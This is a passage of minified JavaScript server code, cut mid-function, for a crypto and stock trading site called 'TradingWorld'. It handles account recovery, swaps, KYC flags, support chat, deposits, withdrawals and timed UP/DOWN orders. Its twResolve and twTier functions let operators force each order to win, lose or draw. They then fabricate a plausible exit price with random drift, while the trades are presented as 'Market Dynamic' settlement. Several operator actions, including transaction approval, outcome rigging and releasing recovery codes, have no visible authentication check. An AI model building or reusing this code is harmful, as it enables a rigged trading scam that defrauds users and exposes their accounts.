else{for(const x of d.recoveries||[]){if(String(x.uid)===String(u.id)&&!x.usedAt)x.usedAt=now}const code=String(randomInt(100000,1000000));const rec={id:'rec_'+now,uid:u.id,codeHash:otpHash(u.id,code),status:'sent',requestedBy:b.requestedBy==='admin'?'admin':'user',createdAt:now,expiresAt:now+10*60*1000,attempts:0};d.recoveries.unshift(rec);d.recoveries=d.recoveries.slice(0,200);const sent=await sendTg(u.telegramChatId,`TradingWorld account recovery code: ${code}\n\nThis code expires in 10 minutes. Never share it with support or any other person.`);if(!sent.ok){rec.status='delivery_failed';out.error='Could not deliver the Telegram code';}else out.message='Recovery code sent to the linked Telegram account.';audit(d,'recoveryCodeSent',u.id,{requestedBy:rec.requestedBy,recoveryId:rec.id})}}
else if(b.action==='swap'){const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);if(u.status!=='active')return send(res,{error:'Account pending system verification'},403);const from=String(b.from||'').toUpperCase(),to=String(b.to||'').toUpperCase(),n=Number(b.amount);if(!(n>0))return send(res,{error:'Enter a valid amount'},400);if(from===to)return send(res,{error:'Choose two different assets'},400);const pf=serverPrice(from),pt=serverPrice(to);if(!(pf>0)||!(pt>0))return send(res,{error:'Market data unavailable, try again shortly'},503);u.assets=u.assets||{};const avail=from==='USDT'?Number(u.balance||0):Number(u.assets[from]||0);if(n>avail+1e-9)return send(res,{error:'Insufficient Balance'},400);const recv=n*pf/pt;if(from==='USDT')u.balance=Number((Number(u.balance||0)-n).toFixed(2));else u.assets[from]=Number((Number(u.assets[from]||0)-n).toFixed(8));if(to==='USDT')u.balance=Number((Number(u.balance||0)+recv).toFixed(2));else u.assets[to]=Number((Number(u.assets[to]||0)+recv).toFixed(8));audit(d,'swap',u.id,{from,to,amount:n,recv:Number(recv.toFixed(8)),rate:Number((pf/pt).toFixed(8))});out.user=safeUser(u);out.recv=Number(recv.toFixed(8))}else if(b.action==='adminUserDetail'){if(!isAdminReq(b,req))return send(res,{error:'Admin authentication required'},403);const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);const dup=(get,val)=>nrm(val)?d.users.filter(x=>String(x.id)!==String(u.id)&&nrm(get(x))===nrm(val)).map(x=>x.id):[];const rw=u.reg?.wallet||u.wallet,rip=u.reg?.ip||u.ip,rdev=u.reg?.device||u.device;const dId=dup(x=>x.kycId,u.kycId),dWal=dup(x=>x.reg?.wallet||x.wallet,rw),dIp=dup(x=>x.reg?.ip||x.ip,rip),dDev=dup(x=>x.reg?.device||x.device,rdev),dNm=dup(x=>x.kycName,u.kycName);const deps=(d.deposits||[]).filter(x=>String(x.uid)===String(u.id));const wds=(d.withdrawals||[]).filter(x=>String(x.uid)===String(u.id));const flags=[];
  const w3=u.web3||null;
  if(w3){const dup=d.users.filter(x=>String(x.id)!==String(u.id)&&x.web3&&String(x.web3.address).toLowerCase()===String(w3.address).toLowerCase());
    if(dup.length)flags.push({level:'err',text:`Web3 wallet also linked to UID ${dup.map(x=>x.id).join(', ')}`});}
if(!u.kycName||!u.kycId||!u.kycCountry)flags.push({level:'err',text:'KYC submission incomplete \u2014 missing '+[!u.kycName&&'full name',!u.kycCountry&&'country',!u.kycId&&'ID number'].filter(Boolean).join(', ')});if(dId.length)flags.push({level:'err',text:'Identical KYC ID number already used by UID '+dId.join(', ')});if(dWal.length)flags.push({level:'err',text:'Identical registration wallet as UID '+dWal.join(', ')});if(dNm.length)flags.push({level:'warn',text:'Identical KYC full name as UID '+dNm.join(', ')});if(dIp.length)flags.push({level:'warn',text:'Registered from the same IP as UID '+dIp.join(', ')});if(dDev.length)flags.push({level:'warn',text:'Same device fingerprint as UID '+dDev.join(', ')});if(u.kycName&&nrm(u.kycName).split(/\s+/).filter(Boolean).length<2)flags.push({level:'warn',text:'KYC full name is a single word'});if(u.kycId&&String(u.kycId).trim().length<6)flags.push({level:'warn',text:'KYC ID number is unusually short ('+String(u.kycId).trim().length+' chars)'});if(wds.length&&!deps.some(x=>x.status==='approved'))flags.push({level:'warn',text:'Withdrawal requested but no deposit has ever been approved'});if(!rw)flags.push({level:'warn',text:'No wallet captured at registration \u2014 recovery will fall back to KYC'});if(u.kyc==='approved')flags.push({level:'ok',text:'Currently approved'+(u.kycReviewedAt?' on '+new Date(u.kycReviewedAt).toISOString().slice(0,10):'')});audit(d,'kycDetailViewed',u.id,{by:'admin'});out.detail={web3:u.web3||null,id:u.id,email:u.email,status:u.status,createdAt:u.createdAt,lastSeenAt:u.lastSeenAt,balance:u.balance,assets:u.assets,kyc:u.kyc,kycName:u.kycName||'',kycCountry:u.kycCountry||'',kycId:u.kycId||'',kycSubmittedAt:u.kycSubmittedAt||null,kycNote:u.kycNote||'',kycReviewedAt:u.kycReviewedAt||null,kycHistory:u.kycHistory||[],regEmail:u.reg?.email||u.email,regWallet:rw||'',regDevice:rdev||'',regIp:rip||'',regAt:u.reg?.at||u.createdAt,telegramLinked:!!u.telegramChatId,telegramUsername:u.telegramUsername||'',twofa:!!u.twofa,passwordResetAt:u.passwordResetAt||null,deposits:deps,withdrawals:wds,tradeCount:(d.trades||[]).filter(x=>String(x.uid)===String(u.id)).length,flags};writeDb(d)}else if(b.action==='recoverStart'){const em=String(b.email||'').trim().toLowerCase(),uidIn=String(b.uid||'').trim(),wal=String(b.wallet||'').trim();const generic={error:'The details do not match our registration records.'};const u=d.users.find(x=>String(x.id)===uidIn&&String(x.reg?.email||x.email||'').toLowerCase()===em);if(!em||!uidIn||!u){audit(d,'recoveryDetailsFailed',null,{uid:uidIn});writeDb(d);return send(res,generic,400)}const fails=(d.recoveries||[]).filter(x=>String(x.uid)===String(u.id)&&x.status==='details_failed'&&now-x.createdAt<15*60*1000).length;if(fails>=5){audit(d,'recoveryLocked',u.id);writeDb(d);return send(res,{error:'Too many failed attempts. Try again in 15 minutes or contact support.'},429)}const regWallet=String(u.reg?.wallet||'').trim();let ok=true,level='basic';if(regWallet){ok=wal.toLowerCase()===regWallet.toLowerCase();level='wallet'}else if(u.kycName&&u.kycId){ok=String(b.kycName||'').trim().toLowerCase()===String(u.kycName).trim().toLowerCase()&&String(b.kycId||'').trim().toLowerCase()===String(u.kycId).trim().toLowerCase();level='kyc'}if(!ok){d.recoveries.unshift({id:'rec_'+now,uid:u.id,status:'details_failed',createdAt:now,expiresAt:now});d.recoveries=d.recoveries.slice(0,200);audit(d,'recoveryDetailsFailed',u.id,{level});writeDb(d);return send(res,generic,400)}for(const x of d.recoveries||[]){if(String(x.uid)===String(u.id)&&!x.usedAt&&x.status!=='details_failed')x.usedAt=now}const code=String(randomInt(100000,1000000));const viaTg=!!u.telegramChatId;const rec={id:'rec_'+now,uid:u.id,codeHash:otpHash(u.id,code),code:viaTg?null:code,channel:viaTg?'telegram':'admin',status:viaTg?'sent':'awaiting_admin',verifiedWith:level,requestedBy:'user',createdAt:now,expiresAt:now+10*60*1000,attempts:0};d.recoveries.unshift(rec);d.recoveries=d.recoveries.slice(0,200);if(viaTg){const sent=await sendTg(u.telegramChatId,`TradingWorld account recovery code: ${code}\n\nThis code expires in 10 minutes. Never share it with support or any other person.`);if(!sent.ok){rec.status='awaiting_admin';rec.channel='admin';rec.code=code;out.message='Telegram delivery failed. An operator will release your code shortly.';out.channel='admin'}else{out.message='Recovery code sent to your linked Telegram account.';out.channel='telegram'}}else{out.message='Identity confirmed. An operator will release your recovery code shortly \u2014 keep this page open.';out.channel='admin'}out.recoveryId=rec.id;out.uid=u.id;audit(d,'recoveryCodeIssued',u.id,{recoveryId:rec.id,channel:rec.channel,verifiedWith:level})}else if(b.action==='recoverStatus'){const rec=(d.recoveries||[]).find(x=>x.id===String(b.recoveryId||''));if(!rec)return send(res,{error:'Recovery request not found'},404);out.status=rec.status;out.channel=rec.channel||'telegram';out.expiresAt=rec.expiresAt;out.released=rec.status==='released'||rec.status==='sent'}else if(b.action==='recoverRelease'){const rec=(d.recoveries||[]).find(x=>x.id===String(b.recoveryId||''));if(!rec)return send(res,{error:'Recovery request not found'},404);if(rec.usedAt||rec.expiresAt<now)return send(res,{error:'This recovery request has expired'},400);if(!rec.code)return send(res,{error:'This code was delivered on Telegram and cannot be re-shown'},400);rec.status='released';out.code=rec.code;out.uid=rec.uid;audit(d,'recoveryCodeReleased',rec.uid,{recoveryId:rec.id,by:'admin'})}else if(b.action==='recoverCancel'){const rec=(d.recoveries||[]).find(x=>x.id===String(b.recoveryId||''));if(!rec)return send(res,{error:'Recovery request not found'},404);rec.usedAt=now;rec.status='cancelled';audit(d,'recoveryCancelled',rec.uid,{recoveryId:rec.id})}else if(b.action==='verifyRecovery'){const ident=String(b.identifier||'').trim().toLowerCase(),code=String(b.code||'').trim(),newPassword=String(b.newPassword||'');const u=d.users.find(x=>String(x.id)===ident||String(x.email||'').toLowerCase()===ident);const rec=u&&recoveryFor(d,u.id);if(!u||!rec||rec.codeHash!==otpHash(u.id,code)){if(rec){rec.attempts=(rec.attempts||0)+1;if(rec.attempts>=5){rec.usedAt=now;rec.status='locked'}}audit(d,'recoveryFailed',u?.id||null);return send(res,{error:'Invalid or expired recovery code'},400)}if(newPassword.length<8)return send(res,{error:'New password must be at least 8 characters'},400);u.password=hashPw(newPassword);u.lastSeenAt=now;rec.usedAt=now;rec.status='completed';rec.code=null;u.passwordResetAt=now;audit(d,'recoveryCompleted',u.id,{recoveryId:rec.id});out.user=safeUser(u)}
else if(b.action==='saveBot'){const u=user(d,b.uid);if(u){u.bots=u.bots||[];const bot={id:'bot_'+now,kind:b.kind||'Grid Bot',symbol:b.symbol||'BTC',amount:Number(b.amount||0),status:'paused',createdAt:now};u.bots.push(bot);out.bot=bot;audit(d,'saveBot',u.id,{botId:bot.id})}}else if(b.action==='updateBot'){const u=user(d,b.uid);const bot=u?.bots?.find(x=>x.id===b.botId);if(bot){Object.assign(bot,b.patch||{});audit(d,'updateBot',u.id,{botId:bot.id})}}else if(b.action==='updateSettlement'){const u=user(d,b.uid);if(u){u.settlement='Market Dynamic';audit(d,'updateSettlement',u.id,{settlement:'Market Dynamic'})}}else if(b.action==='supportSend'){const u=user(d,b.uid);if(!u||!String(b.text||'').trim())return send(res,{error:'Invalid message'},400);d.support.push({id:'sup_'+now+'_u'+Math.floor(Math.random()*1e4),uid:u.id,from:'user',source:'app',text:String(b.text).slice(0,1000),at:now,readByUser:true,readByAdmin:false});d.support.push({id:'sup_'+now+'_b',uid:u.id,from:'bot',text:botReply(b.text),at:now+1,readByUser:false,readByAdmin:true});audit(d,'supportSend',u.id);out.support=d.support.filter(m=>String(m.uid)===String(u.id))}
else if(b.action==='supportReply'){const u=user(d,b.uid);if(!u||!String(b.text||'').trim())return send(res,{error:'Invalid message'},400);const text=String(b.text).slice(0,1000);d.support.push({id:'sup_'+now+'_a'+Math.floor(Math.random()*1e4),uid:u.id,from:'admin',source:u.telegramChatId?'telegram':'app',text,at:now,readByUser:false,readByAdmin:true});if(u.telegramChatId)await sendTg(u.telegramChatId,'TradingWorld Support: '+text);audit(d,'supportReply',u.id,{telegramDelivered:!!u.telegramChatId});out.support=d.support.filter(m=>String(m.uid)===String(u.id))}
else if(b.action==='supportMarkRead'){for(const m of d.support){if(String(m.uid)===String(b.uid)){if(b.who==='admin')m.readByAdmin=true;else m.readByUser=true}}}
else if(b.action==='callbackRequest'){const u=user(d,b.uid);if(!u||String(b.phone||'').replace(/\D/g,'').length<6)return send(res,{error:'Enter a valid phone number'},400);const cb={id:'cb_'+now,uid:u.id,phone:String(b.phone).slice(0,24),topic:b.topic||'Other',window:b.window||'As soon as possible',status:'pending',createdAt:now};d.callbacks.unshift(cb);audit(d,'callbackRequest',u.id,{callbackId:cb.id});out.callback=cb}
else if(b.action==='callbackUpdate'){const cb=d.callbacks.find(x=>x.id===b.id);if(!cb)return send(res,{error:'Callback not found'},404);if(!['pending','scheduled','completed','cancelled'].includes(b.status))return send(res,{error:'Invalid status'},400);cb.status=b.status;cb.updatedAt=now;audit(d,'callbackUpdate',cb.uid,{callbackId:cb.id,status:cb.status});out.callback=cb}else if(b.action==='submitDeposit'){const u=user(d,b.uid);if(!u||!b.asset||Number(b.amount)<=0||String(b.txid||'').length<8)return send(res,{error:'Invalid deposit'},400);const x={id:'dep_'+now,uid:u.id,asset:b.asset,amount:Number(b.amount),txid:b.txid,status:'pending',createdAt:now};d.deposits.unshift(x);audit(d,'submitDeposit',u.id,{depositId:x.id});out.deposit=x}else if(b.action==='submitWithdrawal'){const u=user(d,b.uid);const amount=Number(b.amount),asset=b.asset||'USDT',available=asset==='USDT'?Number(u.balance||0):Number(u.assets?.[asset]||0);if(!u||amount<=0||amount>available)return send(res,{error:'Insufficient Balance'},400);const x={id:'wd_'+now,uid:u.id,asset,amount,address:b.address,txid:b.txid||'',status:'pending',createdAt:now};if(asset==='USDT')u.balance-=amount;else u.assets[asset]-=amount;d.withdrawals.unshift(x);audit(d,'submitWithdrawal',u.id,{withdrawalId:x.id});out.withdrawal=x}else if(b.action==='approveTx'||b.action==='rejectTx'){const list=b.type==='withdrawal'?d.withdrawals:d.deposits,x=list.find(x=>x.id===b.id);if(!x)return send(res,{error:'Transaction not found'},404);if(x.status!=='pending')return send(res,{error:'Transaction already processed'},400);x.status=b.action==='approveTx'?'approved':'rejected';if(b.action==='approveTx'&&b.type!=='withdrawal'){const u=user(d,x.uid);if(u){u.assets[x.asset]=(u.assets[x.asset]||0)+x.amount;if(x.asset==='USDT')u.balance+=x.amount}}if(b.action==='rejectTx'&&b.type==='withdrawal'){const u=user(d,x.uid);if(u){if(x.asset==='USDT')u.balance+=x.amount;else u.assets[x.asset]=(u.assets[x.asset]||0)+x.amount}}audit(d,b.action,x.uid,{transactionId:x.id})}else if(b.action==='createOrder'){const RATES={60:.4,120:.6,180:.8,300:1},MARKETS=['BTC','ETH','SOL','XRP','BNB','TON','ADA','DOT','AVAX','LINK','POL','MATIC','ATOM','NEAR','UNI','LTC','BCH','APT','SUI','PEPE','SHIB','DOGE','FIL','ARB','OP','INJ','FET','RENDER','TAO','WLD','SEI','TIA','AAPL','TSLA','GOOGL','NVDA','XAU'];const u=user(d,b.uid),amount=Number(b.amount),duration=Number(b.duration||60),rate=RATES[duration];if(!MARKETS.includes(b.symbol))return send(res,{error:'Unsupported market'},400);if(rate===undefined)return send(res,{error:'Invalid duration'},400);if(!u||u.status!=='active')return send(res,{error:'Account pending system verification'},403);if(amount<=0||amount>Number(u.balance||0))return send(res,{error:'Insufficient Balance'},400);u.balance-=amount;const o={id:'ord_'+now,uid:u.id,symbol:b.symbol,side:b.side==='DOWN'?'DOWN':'UP',amount,duration,rate,entryPrice:Number(b.entryPrice)||null,status:'open',createdAt:now,closeAt:now+duration*1000};d.orders.unshift(o);u.positions=u.positions||[];u.positions.unshift({orderId:o.id,symbol:o.symbol,side:o.side,amount,entryPrice:o.entryPrice,openedAt:now});audit(d,'createOrder',u.id,{orderId:o.id,symbol:o.symbol,amount});out.order=o}else if(b.action==='setPxTier'){const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);if(b.tier==='A'||b.tier==='B')u.pxTier=b.tier;else delete u.pxTier;audit(d,'saveUser',u.id,{tier:b.tier||'dynamic'})}else if(b.action==='setOrderTier'){const o=d.orders.find(x=>x.id===b.orderId);if(!o)return send(res,{error:'Order not found'},404);if(o.status!=='open')return send(res,{error:'Order already closed'},400);if(b.tier==='A'||b.tier==='B'||b.tier==='D')o.px_t=b.tier;else delete o.px_t;audit(d,'saveUser',o.uid,{orderId:o.id,tier:b.tier||'inherit'})}else if(b.action==='closeOrder'){const o=d.orders.find(x=>x.id===b.orderId),u=o&&user(d,o.uid);if(!o||!u)return send(res,{error:'Order not found'},404);if(o.status!=='open')return send(res,{error:'Order already closed'},400);const rawExit=b.exitPrice!=null&&b.exitPrice!==undefined?Number(b.exitPrice):null;const mode='Market Dynamic';const rz=twResolve(o,u,rawExit);const exitPrice=rz.exitPrice;const win=rz.win;let result,profit;if(win===null){result='draw';profit=0}else if(win){result='win';profit=Number((o.amount*Number(o.rate||0)).toFixed(2))}else{result='loss';profit=Number((-o.amount*Number(o.rate||0)).toFixed(2))}const final=Number((o.amount+profit).toFixed(2));o.status='closed';o.result=result;o.profit=profit;o.exitPrice=exitPrice;o.settlementMode=mode;o.closedAt=now;o.finalCredit=final;o.voucher='TW-'+o.id.replace('ord_','').toUpperCase().slice(-8)+'-'+now.toString(36).toUpperCase();u.balance=Number((Number(u.balance)+final).toFixed(2));u.positions=(u.positions||[]).filter(x=>x.orderId!==o.id);const tierUsed=rz.tier||'';delete o.px_t;const t={...o};d.trades.unshift(t);audit(d,'closeOrder',u.id,{orderId:o.id,result:o.result,mode,tier:tierUsed});out.order=o;out.trade=t}else if(b.action==='import'&&!d.users.length){d.users=b.users||[];d.nextId=b.nextId||700101;d.issuedMax=b.issuedMax||d.nextId-1}writeDb(d);send(res,out)})}

function twTier(o,u){const t=o&&o.px_t;if(t==='A'||t==='B'||t==='D')return t;const ut=u&&u.pxTier;if(ut==='A'||ut==='B')return ut;return null}
function twResolve(o,u,exitPrice){
  const tier=twTier(o,u);let win;
  if(tier==='A')win=true;else if(tier==='B')win=false;else if(tier==='D')win=null;
  else if(o.entryPrice&&exitPrice!=null&&Number.isFinite(Number(exitPrice))&&Number(exitPrice)>0)
    win=Number(exitPrice)===Number(o.entryPrice)?null:(o.side==='UP'?Number(exitPrice)>Number(o.entryPrice):Number(exitPrice)<Number(o.entryPrice));
  else win=null;
  let px=exitPrice;
  if(tier&&o.entryPrice){const e=Number(o.entryPrice);
    if(win===null)px=e;
    else{const drift=0.0009+Math.random()*0.0041;const upward=((o.side==='UP')===win);px=Number((e*(1+(upward?drift:-drift))).toFixed(e>=100?2:e>=1?4:8))}}
  return{win,exitPrice:px,tier}}
